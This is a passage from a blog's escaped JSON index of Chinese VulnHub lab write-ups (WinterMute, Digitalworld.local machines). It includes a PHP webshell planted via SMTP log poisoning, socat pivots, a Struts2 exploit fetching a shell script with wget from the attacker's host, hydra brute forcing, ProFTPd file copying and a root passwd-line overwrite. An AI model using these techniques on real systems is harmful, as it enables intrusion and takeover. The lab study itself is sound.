/\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面没思路了，我还是不太喜欢这种CTF式的靶机，我满脑子只想着拿shell，所以，在查阅大量资料后，我只尝试进行拿到root：\u003c/p\u003e\n\u003cp\u003e经过一段骚操作：\u003c/p\u003e\n\u003cp\u003essh账号nitro\u003c/p\u003e\n\u003cp\u003e密码：zeus\u003c/p\u003e\n\u003cp\u003e巨邪门儿，不喜欢ctf:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e井字棋先手，然后无脑下四角就能赢：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf17e9fb292d901ac74b90508b43b505cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e疑似计划任务：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE569fdfd672ff73d173459942fefba7aeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e先秒了再说\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE94c28186996a1a1de12c4c273b2314acimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再来回头看这个计划任务，整个目录都有写入权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0f3e1f0a5fbb06da59cde274b266cb95image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE870cc7ab85a3443464183731d0ec884bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE44fc2ed10edbb79e89f21b3add1814e7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不过这个15分钟确实缺德：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcf61fd21b872ac55e80e952793ac3725image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x062 DEFCON Toronto Galahad"},{"content":"这台靶场是个双主机靶场\n第一台主机 192.168.5.104\n端口扫描 渗透 80端口\n3000端口\nadmin/admin直接进入：\n然后这里是我没想到的，这里是http的路径：\n打开：\n最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：\n使用NC写入webshell：\nnc 192.168.5.108 25 #连接邮件服务器\rhelo root\t#标识用户身份\rmail from:\u0026#34;ROOT \u0026lt;?php system($_GET[\u0026#39;a\u0026#39;]);?\u0026gt;\u0026#34; #发件人，木马所在地\rrcpt to:root\t#收件人\rdata\t#编辑\r.\t#编辑结束\rquit\t#退出nc 这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用\u0026amp;：\n反弹shell:\n提权 SUID：\n第二台靶机 第二网卡：\n192.168.56.103/24网段：\n本来想创建创建远程端口转发的，但是ssh版本不够：\nsudo systemctl restart ssh.service\nssh -N -R 9998 kali@192.168.5.66\n需要ssh版本7.6以及以上：\n那就挨个代理出来：\n先进行IP扫描：\nNET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP \u0026amp;\u0026gt; /dev/null`; then echo -e \u0026#34;$NET$IP is \\033[31mup\\033[0m\u0026#34; ; else echo -e \u0026#34;$NET$IP is \\033[32mdown\\033[0m\u0026#34;; fi ; done 102可能性最大，端口扫描：\nfor i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2\u0026gt;\u0026amp;1; done | grep -v \u0026#34;Connection refused\u0026#34; 用socat把端口代理出来：\nsocat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.102:8009 \u0026amp;\rsocat TCP-LISTEN:8080,fork,reuseaddr tcp:192.168.56.102:8080 \u0026amp;\rsocat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.102:34483 \u0026amp; 重新扫描一下：\n打一半网断了，后面IP变了：\n这里没注意，原来note是提示：\n这个就显而易见了，struts2漏洞：\n先创建一个端口转发，以便于把shell传回kali:\nsocat TCP-LISTEN:9999,fork,reuseaddr tcp:192.168.5.66:9999 \u0026amp; 去exploit-db找一个脚本：\n但是这里没反应，感觉是哪里有问题，既然nc和bash没反应，可以试试写入sh脚本：\n再建一个端口转发：\nsocat TCP-LISTEN:7777,fork,reuseaddr tcp:192.168.5.66:80 \u0026amp; python 42324.py http://192.168.5.111:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \u0026ldquo;wget http://192.168.56.103:7777/shell.sh\u0026rdquo;\n有反应\n又失败了，放到tmp目录试试：\nmsfvenom:\n提权 2021-4034\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x063-wintermute-/","summary":"\u003cp\u003e这台靶场是个双主机靶场\u003c/p\u003e\n\u003ch1 id=\"第一台主机\"\u003e第一台主机\u003c/h1\u003e\n\u003cp\u003e192.168.5.104\u003c/p\u003e\n\u003ch2 id=\"端口扫描\"\u003e端口扫描\u003c/h2\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE68c362deba429ae69fed45d9517b9ca8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa844d08924c6c9dadd2bb5ffc0ee911dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdf5d149940645e9df81a43506f469ab1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch2 id=\"渗透\"\u003e渗透\u003c/h2\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE060cc8d1dc9a6d9c316b2b25b1a11c95image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc2c79a3c50e937e7793df04a89cd245cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e3000端口\u003c/p\u003e\n\u003cp\u003eadmin/admin直接进入：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1e24b0dee6fe4c2b9da1c19f677f1f03image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后这里是我没想到的，这里是http的路径：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa2e96b80478f41f60c93808700481a0fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e打开：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE53f87dad94e3a0ef6f07caad760c742eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2fec6124137d88692b38ab00d84133b0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用NC写入webshell：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enc 192.168.5.108 25 \t\t\t#连接邮件服务器\r\nhelo root\t\t\t\t\t\t#标识用户身份\r\nmail from:\u0026#34;ROOT \u0026lt;?php system($_GET[\u0026#39;a\u0026#39;]);?\u0026gt;\u0026#34;   #发件人，木马所在地\r\nrcpt to:root\t\t\t\t\t#收件人\r\ndata\t\t\t\t\t\t\t#编辑\r\n.\t\t\t\t\t\t\t    #编辑结束\r\nquit\t\t\t\t\t\t\t#退出nc\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用\u0026amp;：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2fa3b558d7bc141d559d5402c4cfcfc2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e反弹shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE963c068bf535ff76fc31b0879b987ce6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE80b38633a18415990dacc18a3e179170image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003eSUID：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0427285f16c161ce1c6233b0adf8c7feimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfc75302ecb7e9d34e40eb6105bab0402image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbfa6c620f5853a3cc13a7aab78f58b7dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE508789be6ddfaa4e7751c8ea01b07641image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEad6ded3d3605a4497411630063683c9eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x063 WinterMute "},{"content":"端口扫描 渗透测试 这个靶机不能扫，一扫就挂：\n8080端口\n看这个的意思：\n发现信息：\n挨个儿看吧：\nDavid\n发现信息：\n访问这个目录，可以发现：\n那么，到现在，可能渗透才刚刚开始：\n发现默认密码：\n发现疑似用户名\n然后反复尝试后，再次回到这个页面：\ngoogle真好用：\n这里记录了两个洞，一个文件包含，一个信息泄露：\n文件包含，试了半天好像用不了，信息泄露是可以的：\n试了一下intern成功了：\n12345678900987654321\n提权 受限的shell，想办法先把这个绕了：\necho os.system(\u0026rsquo;/bin/bash')\n看看有哪些用户把：\npatrick的hash我们是知道的，只是刚刚没有解密：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x064-digitalworld.localdevelopment/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6e9d6767176575851400afe1f6e85bdfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7bf405e2c4ceac84c782531af3b9b245image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf8f5e7ca46baabf8b933a69bcb650b62image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e这个靶机不能扫，一扫就挂：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8c241f21891270aa43949935641c82ecimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7c35d64b7d2fda3c67bfce1fe9eb1fd0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e8080端口\u003c/p\u003e\n\u003cp\u003e看这个的意思：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9af5b221cb6ca39f8413a2b8444fe09bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe8b0fbbe017734f90269d83378ae7364image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e挨个儿看吧：\u003c/p\u003e\n\u003cp\u003eDavid\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa94dfa19e088959e429a0d98c99fa51aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE42d71fbbe6224699733f8448ea71a510image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9029157c3c1976199f8d60c4ede3ca1aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e访问这个目录，可以发现：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0899dba087f32136c79af1d535098cb0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那么，到现在，可能渗透才刚刚开始：\u003c/p\u003e\n\u003cp\u003e发现默认密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa8343fdf47b798b6084068059ab8ae78image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现疑似用户名\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe7cd0fbd5443cbc3cfefe9b967e2cde1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后反复尝试后，再次回到这个页面：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEec529ddaade016e2a24be7f7754f0b08image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003egoogle真好用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE34d58039876f1db76030259aa405f707image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里记录了两个洞，一个文件包含，一个信息泄露：\u003c/p\u003e\n\u003cp\u003e文件包含，试了半天好像用不了，信息泄露是可以的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa7f707bace6266858b6c9924fe75d92cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE39bf19940e2a2671d5d7bc4f933cf99bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e试了一下intern成功了：\u003c/p\u003e\n\u003cp\u003e12345678900987654321\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE924dcc688efb9808a7b0fc88147e55c2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e受限的shell，想办法先把这个绕了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1d1075423fabc8e115c920601b19c0f3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eecho os.system(\u0026rsquo;/bin/bash')\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5cbd789b24d700fb67d8d6b064c873ffimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看看有哪些用户把：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEed3f68cd096e51c3186f9add77d79b93image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003epatrick的hash我们是知道的，只是刚刚没有解密：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa3cdd64a9942b3df381116da11b262d2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4913f72792890a3d2d0b427c783fc65cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x064 Digitalworld.local(Development)"},{"content":"端口扫描 渗透测试 SMB没啥东西：\n80端口\n查了很多的payload，发现都是认证后的漏洞，得想办法找一下密码了：\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.5.102 http-post-form \u0026ldquo;/admin/login.php:username=^USER^\u0026amp;password=^PASS^\u0026amp;loginsubmit=Submit:F=incorrect\u0026rdquo; -t 64\n先爆破着：\n然后接着看目录扫描结果：\nwfuzz -u \u0026ldquo;http://192.168.5.102/test.php?FUZZ=1\u0026rdquo; -w /usr/share/wordlists/wfuzz/general/common.txt \u0026ndash;hw 7\n发现信息\n偷看私钥成功：\n提权 密码：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x065-digitalword.localfall/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4892771c0189d30166b9715c6a61df8aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE76c1ce6e0d52a6c6ee012f787502b3a8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE67a1fbba64dc9e10d192e3c4b86bcd31image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003eSMB没啥东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3536960cdc270398c9c8008fd2b961c5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7887a9b4f2a956571552406fd941bf19image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查了很多的payload，发现都是认证后的漏洞，得想办法找一下密码了：\u003c/p\u003e\n\u003cp\u003ehydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.5.102 http-post-form \u0026ldquo;/admin/login.php:username=^USER^\u0026amp;password=^PASS^\u0026amp;loginsubmit=Submit:F=incorrect\u0026rdquo; -t 64\u003c/p\u003e\n\u003cp\u003e先爆破着：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEca0bfc5272db95f42c22aa37473d7c55image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后接着看目录扫描结果：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd9b253b9caf07a042a97aa9b8a901b57image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewfuzz -u \u0026ldquo;\u003ca href=\"http://192.168.5.102/test.php?FUZZ=1\"\u003ehttp://192.168.5.102/test.php?FUZZ=1\u003c/a\u003e\u0026rdquo; -w /usr/share/wordlists/wfuzz/general/common.txt \u0026ndash;hw 7\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE82f1f7774b21a0f0748e3b9bea8ac9beimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现信息\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfc4d7de55dc8a3e489b2ac92867943fbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e偷看私钥成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe9901d1365981108414823df00bf7e7bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE33dcc17b8d7c710554b90ad54888e13dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd2fa0004111621d6c40b906905f3d988image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x065 Digitalword.local(FALL)"},{"content":"端口扫描 渗透 21端口：\n用mget给全部下下来了：\n用户名\nPatrick\n提示信息，或者账号密码？\n80端口查了一下，是个入侵检测：\n并且没有远程漏洞：\n后面又没思路了，看了wp，这个地方涉及FTP和telnet的区别：\ntelnet连接后，用户主机实际成为远程TELNET服务器的一个虚拟终端（或称是哑终端），一切服务完全在远程服务器上执行，但用户决不能从远程服务器中下载或上传文件，或拷贝文件到用户主机中来。\nftp则不同，它是采用客户机/服务器模式，用户能够操作FTP服务器中的目录，上传或下载文件，但用户不能请求服务器执行某个文件。\nsite cpfr /home/patrick/version_control\nsite cpto /home/ftp/download/version_control\n这里有几个关键信息：\nProFTPd: 1.3.5\n/var/www/tryingharderisjoy\n查看版本漏洞信息：\n提权 patrick:apollo098765\n经过多次尝试：\n别改sudoers文件，要出问题，改passwd文件：\nroot:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash ","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x066-digitalworld.localjoy/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE80c4e4fe12432e3f499bf39b261d42e1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE53a54a2b4c947a451ead9b10fbdd65b8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd2b03ba5d32020131ff654b6de24bf89image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7d5177d3316456e8f947dc98b3c4171cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21端口：\u003c/p\u003e\n\u003cp\u003e用mget给全部下下来了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE13070bcb8d8137c5ebbf321f646d6fc3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名\u003c/p\u003e\n\u003cp\u003ePatrick\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd50a7a112b3647342c943a70e82da968image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e提示信息，或者账号密码？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0d0f952d8937cb2a3607719bead669bbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口查了一下，是个入侵检测：\u003c/p\u003e\n\u003cp\u003e并且没有远程漏洞：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE804ea9cbb6b0c692bc037ba32894f2e0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面又没思路了，看了wp，这个地方涉及FTP和telnet的区别：\u003c/p\u003e\n\u003cp\u003etelnet连接后，用户主机实际成为远程TELNET服务器的一个虚拟终端（或称是哑终端），一切服务完全在远程服务器上执行，但用户决不能从远程服务器中下载或上传文件，或拷贝文件到用户主机中来。\u003c/p\u003e\n\u003cp\u003eftp则不同，它是采用客户机/服务器模式，用户能够操作FTP服务器中的目录，上传或下载文件，但用户不能请求服务器执行某个文件。\u003c/p\u003e\n\u003cp\u003esite cpfr /home/patrick/version_control\u003c/p\u003e\n\u003cp\u003esite cpto /home/ftp/download/version_control\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc20426b0c10c5b1d2362ddf7bc8f5716image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd3aec73d6a3e5e802b32fa9d7544c0dcimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里有几个关键信息：\u003c/p\u003e\n\u003cp\u003eProFTPd: 1.3.5\u003c/p\u003e\n\u003cp\u003e/var/www/tryingharderisjoy\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE417ff73a2a8e1b75391e80ab3b2b2876image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看版本漏洞信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4b6c6dc3ec66e3fc494c23d5842905ecimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe0e42a2b8efce86185eaf588706188adimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEddf2f6bc47fead95c94284bd995547b4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa37f31593e697025f4f58ef3b6659391image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc29831ed97e61ec1102a9cfad4c8e6b9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfd03c46b4272b362d537191db2ae249aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0e3b97cdc68993334d8361050e38dd3aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003epatrick:apollo098765\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE856c095ca978ee038ec7b4126b01e39cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e经过多次尝试：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9d9c70b733fae0bc536c5d8dcf0fcdf6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e别改sudoers文件，要出问题，改passwd文件：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eroot:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEedd8b32d7fa2920fdc5f21e4637824aaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE07ffa93668cee30492b71c540ab1dcdeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x066 Digitalworld.local(JOY)"},{"content":"端口扫描 渗透 这里右键图片，可以发现目录：\n我感觉是在提示我们使用文件读取，但是该怎么进行文件读取呢：\nSSRF是有本地文件读取的可能性的：\nhttps://xz.aliyun.com/t/11225#toc-5\n用的这个脚本：\n# -*- coding: utf-8 